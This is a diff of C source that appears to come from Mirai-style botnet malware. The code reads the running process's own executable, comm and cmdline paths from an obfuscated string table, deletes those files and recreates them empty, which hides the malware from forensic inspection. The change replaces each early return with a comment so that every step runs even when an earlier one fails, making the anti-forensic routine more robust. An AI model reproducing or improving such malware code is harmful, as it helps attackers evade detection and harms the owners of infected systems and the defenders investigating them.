@@ -44,7 +44,7 @@ fflush(stdout);
     table_unlock_val(PROC_SELF_EXE);
     if((len = readlink(table_retrieve_val(PROC_SELF_EXE, NULL), buf, sizeof(buf) - 1)) == -1)
     {
-        return;
+        // Continue to next step even if EXE readlink fails
     }
 
     remove(buf);
@@ -55,7 +55,7 @@ fflush(stdout);
 
     if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
     {
-        return;
+        // Continue to next step even if EXE open fails
     }
 #ifdef DEBUG 
     printf("[DEBUG] BUFFER REMADE -> EXE\n");
@@ -64,7 +64,6 @@ fflush(stdout);
     
     table_lock_val(PROC_SELF_EXE);
     close(fd);
-    return;
 
 
 
@@ -80,7 +79,7 @@ char buffer2[600];
 
 table_unlock_val(PROC_SELF_COMM);
 if((len = readlink(table_retrieve_val(PROC_SELF_COMM, NULL), buffer2, sizeof(buffer2) -1 )) == -1) {
-	return;
+	// Continue to next step even if COMM readlink fails
 }
 
 remove(buffer2);
@@ -91,7 +90,7 @@ fflush(stdout);
 #endif
 
 if((fd = open(buffer2, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1) {
-	return;
+	// Continue to next step even if COMM open fails
 }
 #ifdef DEBUG
 printf("[DEBUG] BUFFER REOPEND --> COMM\n"); 
@@ -117,7 +116,7 @@ char buffer3[600];
 
 table_unlock_val(PROC_SELF_CMDLINE);
 if((len = readlink(table_retrieve_val(PROC_SELF_CMDLINE, NULL), buffer3, sizeof(buffer3) -1)) == -1) {
-	return;
+	// Continue to next step even if CMDLINE readlink fails
 }
 
 remove(buffer3);
@@ -128,7 +127,7 @@ fflush(stdout);
 #endif
 
 if((fd = open(buffer3, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1){
-	return;
+	// Continue to completion even if CMDLINE open fails
 }
 
 #ifdef DEBUG
